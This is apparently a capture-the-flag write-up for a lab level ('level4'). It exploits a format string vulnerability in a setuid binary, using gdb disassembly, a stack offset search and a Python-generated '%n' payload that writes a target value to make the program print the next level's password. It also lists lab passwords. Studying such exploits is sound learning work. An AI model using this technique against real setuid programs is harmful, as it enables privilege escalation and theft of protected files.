# Level4 - Format string vulnerability - Basic write unsigned integer

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level4 | `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa` |
| level5 | `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a` |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

1. Connect to `level4` user

```shell
ssh level4@$SNOW_HOST -p 4242
# Enter the password

ls -l
> -rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```

Notice there is a binary with level4 setuid and setgid.

2. Debug level4

Execute level4

```shell
./level4
(stdin) abcdef
> abcdef
```

Seems to be like previous levels.

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x08048444  p
  0x08048457  n
  0x080484a7  main
  (...)
```

```shell
gdb-peda$ pdisas main
# (...)
gdb-peda$ pdisas p
# (...)

gdb-peda$ pdisas n
  0x08048457 <+0>:     push   ebp
  0x08048458 <+1>:     mov    ebp,esp
  0x0804845a <+3>:     sub    esp,0x218
  0x08048460 <+9>:     mov    eax,ds:0x8049804              # 0x8049804 <stdin@@GLIBC_2.0>
  0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax
  0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200     # 0x200
  0x08048471 <+26>:    lea    eax,[ebp-0x208]
  0x08048477 <+32>:    mov    DWORD PTR [esp],eax
  0x0804847a <+35>:    call   0x8048350 <fgets@plt>         # call fgets(buf, 0x200, stdin)
  0x0804847f <+40>:    lea    eax,[ebp-0x208]
  0x08048485 <+46>:    mov    DWORD PTR [esp],eax
  0x08048488 <+49>:    call   0x8048444 <p>                 # call p()
  0x0804848d <+54>:    mov    eax,ds:0x8049810              # 0x8049810 <m>:  0x00000000
  0x08048492 <+59>:    cmp    eax,0x1025544                 # compare 0x1025544 (16930116) and 0x8049810
  0x08048497 <+64>:    jne    0x80484a5 <n+78>
  0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590     # 0x8048590: "/bin/cat /home/user/level5/.pass"
  0x080484a0 <+73>:    call   0x8048360 <system@plt>        # call system()
  0x080484a5 <+78>:    leave
  0x080484a6 <+79>:    ret
```

After looking the condition, we want write the value `0x1025544` at the address `0x8049810`.

We need to know the buffer address.

```bash
gdb-peda$ b *p+17 # just after printf
gdb-peda$ run <<< AAAA
[------------------------------------stack-------------------------------------]
0000| 0xbffff410 --> 0xbffff440 ("AAAA\n")
0004| 0xbffff414 --> 0xb7ff26b0 (pop    edx)
0008| 0xbffff418 --> 0xbffff684 --> 0xb7fd0ff4 --> 0x1a4d7c
0012| 0xbffff41c --> 0xb7fd0ff4 --> 0x1a4d7c
0016| 0xbffff420 --> 0x0
0020| 0xbffff424 --> 0x0
0024| 0xbffff428 --> 0xbffff648 --> 0xbffff658 --> 0x0
0028| 0xbffff42c --> 0x804848d (<n+54>: mov    eax,ds:0x8049810)
0032| 0xbffff430 --> 0xbffff440 ("AAAA\n")
0036| 0xbffff434 --> 0x200
0040| 0xbffff438 --> 0xb7fd1ac0 --> 0xfbad2088
0044| 0xbffff43c --> 0xb7ff37d0 (<__libc_memalign+16>:  add    ebx,0xb824)
0048| 0xbffff440 ("AAAA\n")
[------------------------------------------------------------------------------]
```

The buffer pointer is 12 addresses before the printf argument.

So we can build our exploit:

- `m` address: `0x8049810` <=> `\x10\x98\x04\x08`
- value: `0x1025544 - 0x4 = 0x1025540` <=> 16930112
- buffer relative address: `%12%n`

=> `"\x10\x98\x04\x08" + "%16930112x" + "%12$n"`

Lets try

```bash
./level4 < <(python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")')
> (...)
  0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---

## Sources

### Format string vulnerability

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)

### Shell

- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man printf](https://linux.die.net/man/3/printf)
- [Man system](https://linux.die.net/man/3/system)
